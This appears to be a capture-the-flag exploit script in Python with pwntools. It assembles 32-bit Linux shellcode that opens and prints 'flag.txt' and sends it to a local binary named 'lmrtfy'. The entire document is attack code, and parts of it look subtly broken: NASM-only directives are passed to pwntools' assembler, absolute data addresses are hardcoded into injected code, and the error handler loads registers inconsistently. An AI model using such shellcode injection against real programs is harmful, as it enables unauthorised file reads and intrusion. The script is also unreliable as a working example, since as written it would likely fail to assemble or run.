from pwn import *

# Define the shellcode to read the file
shellcode = asm("""section .text
global _start

_start:
    ; Open the file
    xor eax, eax           ; Clear eax register
    xor ebx, ebx           ; Clear ebx register
    mov al, 5              ; System call number for open (5)
    mov ebx, path          ; Load address of filename into ebx
    xor ecx, ecx           ; Clear ecx register
    xor edx, edx           ; Clear edx register
    int 0x80               ; Invoke syscall

    ; Check if file opened successfully
    test eax, eax          ; Check return value (file descriptor)
    js error               ; Jump to error handling if negative

    ; Read from the file
    mov ebx, eax           ; Move file descriptor to ebx for read syscall
    xor eax, eax           ; Clear eax register
    mov al, 3              ; System call number for read (3)
    mov ecx, buffer        ; Load buffer address into ecx
    mov edx, 0x100         ; Number of bytes to read
    int 0x80               ; Invoke syscall

    ; Write to stdout
    xor eax, eax           ; Clear eax register
    mov al, 4              ; System call number for write (4)
    mov ebx, 1             ; File descriptor for stdout (1)
    mov ecx, buffer        ; Load buffer address into ecx
    mov edx, eax           ; Number of bytes to write
    int 0x80               ; Invoke syscall

    ; Exit
    xor eax, eax           ; Clear eax register
    mov al, 1              ; System call number for exit (1)
    xor ebx, ebx           ; Exit status 0
    int 0x80               ; Invoke syscall

error:
    ; Handle error (you can modify this part based on your needs)
    mov ebx, errmsg        ; Load address of error message into ebx
    call print_errmsg
    jmp exit               ; Jump to exit

print_errmsg:
    ; Print error message to stderr
    mov eax, 4             ; System call number for write (4)
    mov ebx, 2             ; File descriptor for stderr (2)
    mov ecx, errmsg        ; Load address of error message into ecx
    mov edx, errmsg_len    ; Length of error message
    int 0x80               ; Invoke syscall
    ret

exit:
    ; Exit program
    mov eax, 1             ; System call number for exit (1)
    xor ebx, ebx           ; Exit status 0
    int 0x80               ; Invoke syscall

section .data
    path db 'flag.txt', 0  ; Filename
    buffer resb 256         ; Buffer to read file contents into
    errmsg db 'Error!', 0   ; Error message
    errmsg_len equ $ - errmsg  ; Length of error message
""")

# Start a process using Pwntools
r = process(['./lmrtfy'])

# Send the shellcode to the process
r.sendline(shellcode)

# Receive and print the output
print(r.recvall())
